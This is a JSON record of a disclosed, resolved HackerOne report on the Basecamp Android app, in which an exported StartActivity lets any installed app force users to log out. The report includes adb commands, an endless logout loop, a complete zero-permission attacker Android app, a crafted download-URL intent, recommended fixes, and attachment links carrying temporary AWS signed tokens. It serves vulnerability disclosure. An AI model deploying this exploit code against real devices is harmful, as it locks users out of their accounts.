@@ -1,0 +1,153 @@
+{
+  "id": 3764217,
+  "global_id": "Z2lkOi8vaGFja2Vyb25lL1JlcG9ydC8zNzY0MjE3",
+  "url": "https://hackerone.com/reports/3764217",
+  "title": "Any installed app can force immediate logout and persistent DOS of authenticated Basecamp sessions via unprotected exported StartActivity",
+  "state": "Closed",
+  "substate": "resolved",
+  "severity_rating": "medium",
+  "readable_substate": "Resolved",
+  "created_at": "2026-05-27T08:42:24.765Z",
+  "submitted_at": "2026-05-27T08:46:53.237Z",
+  "is_member_of_team?": false,
+  "is_organization_group_member?": false,
+  "is_triager?": false,
+  "reporter": {
+    "disabled": false,
+    "username": "zerodaysec_xyz",
+    "url": "/zerodaysec_xyz",
+    "profile_picture_urls": {
+      "small": "https://profile-photos.hackerone-user-content.com/variants/81g1ocfccnal25hw4hbgdwn9x0gt/72249f83db42955adfcb43c5cad84162ec49002aa21a79c3606f682c8e48f4e6"
+    },
+    "is_me?": false,
+    "cleared": false,
+    "verified": false,
+    "hackerone_triager": false,
+    "hacker_mediation": false
+  },
+  "team": {
+    "id": 67,
+    "url": "https://hackerone.com/basecamp",
+    "handle": "basecamp",
+    "profile_picture_urls": {
+      "small": "https://profile-photos.hackerone-user-content.com/variants/STtZ2opgRsHdKby72xs56KhB/b8e19a7691128fca51630d7f5b14644b91b3b45324f6fd488e36244d744fe35b",
+      "medium": "https://profile-photos.hackerone-user-content.com/variants/STtZ2opgRsHdKby72xs56KhB/89f037b490baf3dcca1b84283f4c85141b64c213252a9c79b56c62bf903ab542"
+    },
+    "permissions": [],
+    "submission_state": "open",
+    "default_currency": "usd",
+    "awards_miles": false,
+    "offers_bounties": true,
+    "state": "public_mode",
+    "only_cleared_hackers": false,
+    "pentest_feature_enabled?": false,
+    "pentest_retesting_ends_at": null,
+    "profile": {
+      "name": "Basecamp",
+      "twitter_handle": "basecamp",
+      "website": "https://37signals.com/policies/security/response",
+      "about": "Basecamp is the leading online project manager and the birthplace of Ruby on Rails. Creators of the HEY email service."
+    }
+  },
+  "has_bounty?": true,
+  "can_view_team": true,
+  "can_view_report": true,
+  "is_external_bug": false,
+  "is_published": false,
+  "is_participant": false,
+  "has_collaborators": true,
+  "submitted_by_team_member": false,
+  "submitted_with_assistant": false,
+  "stage": 4,
+  "public": true,
+  "visibility": "full",
+  "cve_ids": [],
+  "singular_disclosure_disabled": false,
+  "disclosed_at": "2026-07-04T11:05:36.164Z",
+  "bug_reporter_agreed_on_going_public_at": "2026-06-04T11:05:30.397Z",
+  "team_member_agreed_on_going_public_at": null,
+  "comments_closed?": false,
+  "facebook_team?": false,
+  "team_private?": false,
+  "vulnerability_information": "## Summary\nDear team. Our collaborative analysis and test on the latest Android Basecamp app (May 26 update) revealed that `com.basecamp.bc4.app.main.start.StartActivity` is declared `exported=\"true\"` with no `android:permission` guard. Any application installed on the same device, including apps with zero permissions, can launch it with an explicit `Intent`.\n\nWhen triggered against an actively authenticated session, the activity tears down the current session state and forces the user back to the login screen. **This is confirmed by live device testing** (our screenshots attached): the user was fully logged in and using the app; after triggering the intent, Basecamp immediately presented the sign-in screen.\n\nThe behavior is\n- **reliable and repeatable**, it works every single time\n- **silent**, no prompt, no warning, no indicator to the user\n- **persistent**, it can be triggered in a loop, making the app unusable\n- **no special permissions required** by the attacking app\n\nThis is a **forced session termination / availability attack** affecting authenticated users. The attack is directly demonstrable and cross-user (any user of the app on a device that also has a malicious app is affected).\n\n\n## Let's trace the root cause\n\n**`AndroidManifest.xml`**, present in current v5.0.2/v5.0.3:\n```xml\n<activity\n    android:name=\"com.basecamp.bc4.app.main.start.StartActivity\"\n    android:exported=\"true\"\n    android:launchMode=\"singleInstance\"\n    android:windowSoftInputMode=\"adjustResize\"/>\n```\nThere is no `android:permission=\"\"` attribute. No intent-filter to restrict callers to the system or verified apps.\n\n**`StartActivity.java`, `onNewIntent()` path:**\n```java\npublic final void onNewIntent(Intent intent) {\n    kotlin.jvm.internal.k.f(intent, \"intent\");\n    super.onNewIntent(intent);\n    if (((m) this.f6857w.getValue()).a() == o.UpToDate) {\n        r();\n    }\n    m().b(intent);   // NavigationManager.processIntent, no auth-state preservation\n}\n```\n\n**`MainActivity.java`, `y()` method** shows what `StartActivity` does to auth state when it starts fresh: it calls `finish()` on `MainActivity` and starts `StartActivity` with the inbound URI, discarding the existing session's navigation stack entirely:\n```java\npublic final void y() {\n    Intent intent = new Intent(this, (Class<?>) StartActivity.class);\n    intent.setData(getIntent().getData());\n    intent.putExtra(\"launchDataUri\", getIntent().getDataString());\n    startActivity(intent);\n    finish();   // <- authenticated MainActivity is destroyed\n}\n```\n\nThe key issue: `StartActivity` with `launchMode=\"singleInstance\"` means it occupies its own task. When an external app forces it via explicit intent, the running authenticated `MainActivity` loses focus and the StartActivity's boot sequence (which checks auth state on `onCreate`/`onResume`) determines the user is \"not yet started\" in the app context, dispatching them to the login screen.\n\n**We believe the `launchMode=\"singleInstance\"` makes this worse** because normally only one instance of `StartActivity` can exist. When an external app fires an explicit intent at it, Android brings its task to the foreground via `onNewIntent`, which then re-runs the startup navigation sequence, forcing logout regardless of whether a valid session exists.\n\n\n## Steps to reproduce\n\n**Prerequisites:** Basecamp Android installed and actively logged in (confirmed with any valid account). No special permissions needed on attacking device/app.\n\n**Method 1. adb (we used this as it simulates exactly what any installed app can do):**\n\n```bash\n# while Basecamp is open and logged in, run:\nadb shell am start \\\n  -n com.basecamp.bc3/com.basecamp.bc4.app.main.start.StartActivity \\\n  --es launchDataUri \"https://app.basecamp.com/6217076/projects/47432622\"\n```\n\nNote: That url is even an accurate project url created for this test account.\n\n**Observed result:** Basecamp immediately transitions to the sign-in screen. The active session is terminated.\n\n{F5994202}\n\n**Method 2. Persistent DOS loop:**\n```bash\n# Force logout every 30 seconds indefinitely (a malicious app will choose this cleverly):\nwhile true; do\n  adb shell am start \\\n    -n com.basecamp.bc3/com.basecamp.bc4.app.main.start.StartActivity \\\n    --es launchDataUri \"https://app.basecamp.com/6217076/projects/47432622\"\n  sleep 30\ndone\n```\n{F5994200}\n{F5994201}\n\n**Observed result:** User cannot stay logged in. Every time they re-authenticate, the loop forces them out again within 30 seconds. The app becomes completely unusable. Bad review for Basecamp.\n\n\n## Proof of concept\n\n### POC 1. adb one-liner\n```bash\nadb shell am start \\\n  -n com.basecamp.bc3/com.basecamp.bc4.app.main.start.StartActivity \\\n  --es launchDataUri \"https://app.basecamp.com/6217076/projects/47432622\"\n```\n\n### POC 2. Minimal malicious Android app (this represents a realistic attack scenario)\n\nNo permissions needed in `AndroidManifest.xml`:\n```xml\n<manifest xmlns:android=\"http://schemas.android.com/apk/res/android\"\n    package=\"com.attacker.logoutbasecamp\">\n    <application>\n        <activity android:name=\".AttackActivity\" android:exported=\"true\">\n            <intent-filter>\n                <action android:name=\"android.intent.action.MAIN\"/>\n                <category android:name=\"android.intent.category.LAUNCHER\"/>\n            </intent-filter>\n        </activity>\n    </application>\n</manifest>\n```\n\n```java\n// AttackActivity.java\npackage com.attacker.logoutbasecamp;\n\nimport android.app.Activity;\nimport android.content.ComponentName;\nimport android.content.Intent;\nimport android.os.Bundle;\nimport android.os.Handler;\n\npublic class AttackActivity extends Activity {\n\n    private final Handler handler = new Handler();\n    private final Runnable logoutLoop = new Runnable() {\n        @Override\n        public void run() {\n            forceLogout();\n            handler.postDelayed(this, 30000); // repeat every 30 seconds\n        }\n    };\n\n    @Override\n    protected void onCreate(Bundle savedInstanceState) {\n        super.onCreate(savedInstanceState);\n        handler.post(logoutLoop);\n        finish(); // attacker app can immediately close, attack continues via handler\n    }\n\n    private void forceLogout() {\n        Intent intent = new Intent();\n        intent.setComponent(new ComponentName(\n            \"com.basecamp.bc3\",\n            \"com.basecamp.bc4.app.main.start.StartActivity\"\n        ));\n        intent.putExtra(\"launchDataUri\",\n            \"https://app.basecamp.com/6217076/projects/47432622\");\n        intent.setFlags(Intent.FLAG_ACTIVITY_NEW_TASK);\n        startActivity(intent);\n    }\n}\n```\n\n**Note:** The attacker app requires zero permissions, it only calls `startActivity()` with an explicit component, which any app can do on Android regardless of permission level.\n\n\n\n## Our recommendations\n\n**Here is an immediate one-line fix:**\nAdd `android:exported=\"false\"` to `StartActivity` in `AndroidManifest.xml`. Since `StartActivity` has no `intent-filter`, it only needs to be reachable internally, there is no legitimate reason for it to be exported.\n\n**But if export is genuinely needed** (for example, as we suspect, cross-process within the 37signals app suite):\n```xml\n<activity\n    android:name=\"com.basecamp.bc4.app.main.start.StartActivity\"\n    android:exported=\"true\"\n    android:permission=\"com.basecamp.bc3.INTERNAL_LAUNCH\"\n    .../>\n```\nWith a `signature`-level permission so only apps signed with the Basecamp key can start it.\n\n**Proper session-preserving fix:**\nValidate in `onNewIntent()` that an authenticated session exists before tearing it down. If `MainActivity` is already running with a valid session, ignore the external start request or route it to `MainActivity.onNewIntent()` instead.\n\n\n## Supporting evidences\n- `App_screen_logged_in.jpeg`: Device screenshot,  user logged in\n- `App_screen_logged_out.jpeg`: Device screenshot, forced to login screen after attack (same test session, ordered correctly)\n- video POC attached to show exact event. Easily reporduceable.\n- Bug confirmed present in latest versions v5.0.2/5.0.3 (versionCode 473)\n\nThis is a live, tested, reliably reproducible vulnerability.\n\n## Impact\n\n## The confirmed impact\n\nFrom our live device testing with screenshots and video POC provided,\n\n1. **Screenshot 1 (`App_screen_logged_in.jpeg`)**: App is open, user \"Zer0day Sec\" is logged in, viewing the home screen with projects (\"My Project\", \"Making a Podcast\"). Timestamp 07:41.\n\n2. **Attack triggered** (adb command below, or via malicious app intent).\n\n3. **Screenshot 2 (`App_screen_logged_out.jpeg`)**: App immediately switches to the Basecamp sign-in screen (\"The to-dos are in Basecamp. Sign in.\"). User is fully logged out. Timestamp 07:41 (taken one minute after starting, confirming this is the before/after pair in test order).\n\nThe video attached captures the full scenario.\n\n**The test confirms:** an active, logged-in session is terminated with no user interaction. The user must re-authenticate from scratch.\n\n**Secondary impact: DownloadsWorker manipulation:** Because the `launchDataUri` extra is forwarded into navigation unvalidated, an attacker can also force navigation to the downloads fragment with a crafted download URL (for example, a Basecamp blob URL from a different account the attacker has access to), potentially retrieving private attachments if the session cookie is reused:\n```bash\nadb shell am start \\\n  -n com.basecamp.bc3/com.basecamp.bc4.app.main.start.StartActivity \\\n  --es launchDataUri \"https://app.basecamp.com/blobs/VICTIM_BLOB_ID/download/file.pdf\"\n```\n\n**Full impact implications**\n\n- any co-installed app can **instantly log-out any user and force the user back to the login screen**.\n- this works whether Basecamp is in the foreground or background.\n- it can be triggered repeatedly, a persistent annoyance and perceived app instability.\n- users will review Basecamp as bad unreliable (the app keeps logging me out) rather than a malicious background app.\n- interestingly, a competitor could embed this exact intent in their own Android app, silently degrading Basecamp’s user experience for anyone who installs both products.\n- it was demonstrated live with a real project URL (`https://app.basecamp.com/6217076/projects/47432622`).\n\nThis directly affects **strong auth / sessions**, which we believe is one of the Basecamp’s explicit focus areas.",
+  "bounty_amount": "287.0",
+  "formatted_bounty": "$287",
+  "weakness": {
+    "id": 26,
+    "name": "Improper Access Control - Generic"
+  },
+  "original_report_id": null,
+  "original_report_url": null,
+  "attachments": [
+    {
+      "id": 5994200,
+      "file_name": "App_screen_logged_in.jpeg",
+      "expiring_url": "https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/lb6z0zpian00e4yih23ch4fps7dz?response-content-disposition=attachment%3B%20filename%3D%22App_screen_logged_in.jpeg%22%3B%20filename%2A%3DUTF-8%27%27App_screen_logged_in.jpeg&response-content-type=image%2Fjpeg&X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Credential=ASIAQGK6FURQ4KHN2JRR%2F20260704%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20260704T112139Z&X-Amz-Expires=3600&X-Amz-Security-Token=IQoJb3JpZ2luX2VjEFoaCXVzLXdlc3QtMiJHMEUCIQDv%2FlOcQFbfFNuljvDVVswTb9GrOyAc1wHJX%2BrJOlr70QIgA1xSDBM3Msuta3pYYJzK9rcryi3vDjX%2BI%2F6NADLp5ZcqsQUIIxADGgwwMTM2MTkyNzQ4NDkiDLuQTeht2Sg%2FhM%2FAMiqOBdNmYmAMU0eGpq3dDJNu3Iro30eWmVZU5Fk9B7SljdMkKymuz4n6temCyxt8H6V3e%2FA0aGTH68pyXrD%2BY34pgH5x5OcelXayvk5bcIfJRC5RhpZpvNRe6cpjgBkMhrbtU9K%2FUP1j4rB9GWmftHwDKPJoDTK4CJFCke6hWUZr%2FWdeOdB4EquQCz8%2BfSGzKebkCeeB85tCCgrCLayl5EuIrDDLTSbPu%2B13wVBMHsGPX5LZqgj%2FPbotzIaLO5B566tuxQ32jW4xobUMgiO0MXiLrY8rafb0dzSfVT09GILwJmYEgvOFdyLqCrl2B%2FnnA0uW9zoWi03R9ZpcDndlxnf%2FSo3oHgvSiclnjFtCZxSEoxAhaelHHRWyqCG%2FGbSLwAx1bzkdRbBT0yHtY2D14ZfMfReZilc8ncnX2TFlI5NMhyEE9nQp5FEmvUB1Z03LG9yCt1tK7iSzRJtc0L%2FtIRxozkd7icyBIUtt6vIng%2FJo6cn4quJ5OSYMb1kFNZJioGYjylrxo51FFML07Nq220Z5qS9OX%2Bm9CZWqOlHKC43D2gcctJz4wOKWGUWRz3WN2a0jubBo5UYjzHg1Z1xeI3IKnDr2jAhj1XAw5x4sqwWVvH9%2B58%2B5VZYR6zAEvzLk%2BWrccKltZ9rNqrlCVrwQj6lyB9Yrqt9yxmjPmakoqb6Nz44DffbxBR3Mn5voNoTUGm90DxXtagjoT%2FXeEcNKOeb%2FG%2FgZjNYsyjliRNRwX4Pksm137W6h01edhFQIYY7UOs7y2SPC%2Bi4BiZimpuKFKBR4IywXU7D6hMJbrGnH1YsaZXJXhnSkv5kbym4xItp3tp8p%2FrbaZRtBWJa1AG%2B3oVxlc%2B%2BNuukNHt9B2%2B0dVhLI1TCVuaPSBjqxAY6W8p6zG57r7DxxAJdIxVfhzPUPzVAI7AsyTOnQPj%2BFtl9WavVfSsSYMAd3n50QZHgo8TXquJMS1TIM5GsBKQ0A%2Bg82xkYhmj5l5D%2BLMW5pq9d2T%2B8ty%2Fmog9puci7K%2BpQQLfdlVDxON46Y79lEzsBQ3yE6a8yyCI5fQwTJdA3Vreb%2FQ3H3T9JuPAIdbKkL7Veta5rpwwrnALGHq8u4MV2DaKW%2FjmQxnXhlrvv%2B9kxJVQ%3D%3D&X-Amz-SignedHeaders=host&X-Amz-Signature=37ca65355df42978bbd7a1eaad1a042bd7b66ed24e2c541a1fa98eec23a461c5",
+      "file_size": 34347,
+      "type": "image/jpeg",
+      "moderated": false
+    },
+    {
+      "id": 5994201,
+      "file_name": "App_screen_logged_out.jpeg",
+      "expiring_url": "https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/6nf5pq0229ha1lgdqargpm1uipi3?response-content-disposition=attachment%3B%20filename%3D%22App_screen_logged_out.jpeg%22%3B%20filename%2A%3DUTF-8%27%27App_screen_logged_out.jpeg&response-content-type=image%2Fjpeg&X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Credential=ASIAQGK6FURQ4KHN2JRR%2F20260704%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20260704T112139Z&X-Amz-Expires=3600&X-Amz-Security-Token=IQoJb3JpZ2luX2VjEFoaCXVzLXdlc3QtMiJHMEUCIQDv%2FlOcQFbfFNuljvDVVswTb9GrOyAc1wHJX%2BrJOlr70QIgA1xSDBM3Msuta3pYYJzK9rcryi3vDjX%2BI%2F6NADLp5ZcqsQUIIxADGgwwMTM2MTkyNzQ4NDkiDLuQTeht2Sg%2FhM%2FAMiqOBdNmYmAMU0eGpq3dDJNu3Iro30eWmVZU5Fk9B7SljdMkKymuz4n6temCyxt8H6V3e%2FA0aGTH68pyXrD%2BY34pgH5x5OcelXayvk5bcIfJRC5RhpZpvNRe6cpjgBkMhrbtU9K%2FUP1j4rB9GWmftHwDKPJoDTK4CJFCke6hWUZr%2FWdeOdB4EquQCz8%2BfSGzKebkCeeB85tCCgrCLayl5EuIrDDLTSbPu%2B13wVBMHsGPX5LZqgj%2FPbotzIaLO5B566tuxQ32jW4xobUMgiO0MXiLrY8rafb0dzSfVT09GILwJmYEgvOFdyLqCrl2B%2FnnA0uW9zoWi03R9ZpcDndlxnf%2FSo3oHgvSiclnjFtCZxSEoxAhaelHHRWyqCG%2FGbSLwAx1bzkdRbBT0yHtY2D14ZfMfReZilc8ncnX2TFlI5NMhyEE9nQp5FEmvUB1Z03LG9yCt1tK7iSzRJtc0L%2FtIRxozkd7icyBIUtt6vIng%2FJo6cn4quJ5OSYMb1kFNZJioGYjylrxo51FFML07Nq220Z5qS9OX%2Bm9CZWqOlHKC43D2gcctJz4wOKWGUWRz3WN2a0jubBo5UYjzHg1Z1xeI3IKnDr2jAhj1XAw5x4sqwWVvH9%2B58%2B5VZYR6zAEvzLk%2BWrccKltZ9rNqrlCVrwQj6lyB9Yrqt9yxmjPmakoqb6Nz44DffbxBR3Mn5voNoTUGm90DxXtagjoT%2FXeEcNKOeb%2FG%2FgZjNYsyjliRNRwX4Pksm137W6h01edhFQIYY7UOs7y2SPC%2Bi4BiZimpuKFKBR4IywXU7D6hMJbrGnH1YsaZXJXhnSkv5kbym4xItp3tp8p%2FrbaZRtBWJa1AG%2B3oVxlc%2B%2BNuukNHt9B2%2B0dVhLI1TCVuaPSBjqxAY6W8p6zG57r7DxxAJdIxVfhzPUPzVAI7AsyTOnQPj%2BFtl9WavVfSsSYMAd3n50QZHgo8TXquJMS1TIM5GsBKQ0A%2Bg82xkYhmj5l5D%2BLMW5pq9d2T%2B8ty%2Fmog9puci7K%2BpQQLfdlVDxON46Y79lEzsBQ3yE6a8yyCI5fQwTJdA3Vreb%2FQ3H3T9JuPAIdbKkL7Veta5rpwwrnALGHq8u4MV2DaKW%2FjmQxnXhlrvv%2B9kxJVQ%3D%3D&X-Amz-SignedHeaders=host&X-Amz-Signature=98f6e1b5e88910273b84218f4e95e864988f6c060c21208ee384c8b68af3a535",
+      "file_size": 38295,
+      "type": "image/jpeg",
+      "moderated": false
+    },
+    {
+      "id": 5994202,
+      "file_name": "Video_poc_-_log-out_dos.mp4",
+      "expiring_url": "https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/1l7963r61o5w1o7ijzq7w1icph9h?response-content-disposition=attachment%3B%20filename%3D%22Video_poc_-_log-out_dos.mp4%22%3B%20filename%2A%3DUTF-8%27%27Video_poc_-_log-out_dos.mp4&response-content-type=video%2Fmp4&X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Credential=ASIAQGK6FURQ4KHN2JRR%2F20260704%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20260704T112139Z&X-Amz-Expires=3600&X-Amz-Security-Token=IQoJb3JpZ2luX2VjEFoaCXVzLXdlc3QtMiJHMEUCIQDv%2FlOcQFbfFNuljvDVVswTb9GrOyAc1wHJX%2BrJOlr70QIgA1xSDBM3Msuta3pYYJzK9rcryi3vDjX%2BI%2F6NADLp5ZcqsQUIIxADGgwwMTM2MTkyNzQ4NDkiDLuQTeht2Sg%2FhM%2FAMiqOBdNmYmAMU0eGpq3dDJNu3Iro30eWmVZU5Fk9B7SljdMkKymuz4n6temCyxt8H6V3e%2FA0aGTH68pyXrD%2BY34pgH5x5OcelXayvk5bcIfJRC5RhpZpvNRe6cpjgBkMhrbtU9K%2FUP1j4rB9GWmftHwDKPJoDTK4CJFCke6hWUZr%2FWdeOdB4EquQCz8%2BfSGzKebkCeeB85tCCgrCLayl5EuIrDDLTSbPu%2B13wVBMHsGPX5LZqgj%2FPbotzIaLO5B566tuxQ32jW4xobUMgiO0MXiLrY8rafb0dzSfVT09GILwJmYEgvOFdyLqCrl2B%2FnnA0uW9zoWi03R9ZpcDndlxnf%2FSo3oHgvSiclnjFtCZxSEoxAhaelHHRWyqCG%2FGbSLwAx1bzkdRbBT0yHtY2D14ZfMfReZilc8ncnX2TFlI5NMhyEE9nQp5FEmvUB1Z03LG9yCt1tK7iSzRJtc0L%2FtIRxozkd7icyBIUtt6vIng%2FJo6cn4quJ5OSYMb1kFNZJioGYjylrxo51FFML07Nq220Z5qS9OX%2Bm9CZWqOlHKC43D2gcctJz4wOKWGUWRz3WN2a0jubBo5UYjzHg1Z1xeI3IKnDr2jAhj1XAw5x4sqwWVvH9%2B58%2B5VZYR6zAEvzLk%2BWrccKltZ9rNqrlCVrwQj6lyB9Yrqt9yxmjPmakoqb6Nz44DffbxBR3Mn5voNoTUGm90DxXtagjoT%2FXeEcNKOeb%2FG%2FgZjNYsyjliRNRwX4Pksm137W6h01edhFQIYY7UOs7y2SPC%2Bi4BiZimpuKFKBR4IywXU7D6hMJbrGnH1YsaZXJXhnSkv5kbym4xItp3tp8p%2FrbaZRtBWJa1AG%2B3oVxlc%2B%2BNuukNHt9B2%2B0dVhLI1TCVuaPSBjqxAY6W8p6zG57r7DxxAJdIxVfhzPUPzVAI7AsyTOnQPj%2BFtl9WavVfSsSYMAd3n50QZHgo8TXquJMS1TIM5GsBKQ0A%2Bg82xkYhmj5l5D%2BLMW5pq9d2T%2B8ty%2Fmog9puci7K%2BpQQLfdlVDxON46Y79lEzsBQ3yE6a8yyCI5fQwTJdA3Vreb%2FQ3H3T9JuPAIdbKkL7Veta5rpwwrnALGHq8u4MV2DaKW%2FjmQxnXhlrvv%2B9kxJVQ%3D%3D&X-Amz-SignedHeaders=host&X-Amz-Signature=bb78bcca9cc258fe32a353ca1586295f0c9b80e749629258ca79713d6cfd4257",
+      "file_size": 3049028,
+      "type": "video/mp4",
+      "moderated": null
+    }
+  ],
+  "allow_singular_disclosure_at": "2026-07-04T11:05:31.149Z",
+  "allow_singular_disclosure_after": -967.970111606,
+  "singular_disclosure_allowed": true,
+  "vote_count": 1,
+  "voters": [
+    "zerodaysec_xyz"
+  ],
+  "severity": {
+    "rating": "medium",
+    "score": 4.0,
+    "author_type": "Team",
+    "metrics": {
+      "attack_vector": "local",
+      "attack_complexity": "low",
+      "privileges_required": "none",
+      "user_interaction": "none",
+      "scope": "unchanged",
+      "confidentiality": "none",
+      "integrity": "none",
+      "availability": "low"
+    }
+  },
+  "structured_scope": {
+    "databaseId": 4660,
+    "asset_type": "GOOGLE_PLAY_APP_ID",
+    "asset_identifier": "com.basecamp.bc3",
+    "max_severity": "critical"
+  },
+  "abilities": {
+    "assignable_team_members": [],
+    "assignable_team_member_groups": []
+  },
+  "is_exploit_agent_supported?": false,
+  "is_linear_agent_ui_supported?": false,
+  "summaries": [
+    {
+      "category": "team",
+      "can_view?": true,
+      "can_create?": false
+    },
+    {
+      "category": "researcher",
+      "can_view?": true,
+      "can_create?": false
+    }
+  ]
+}
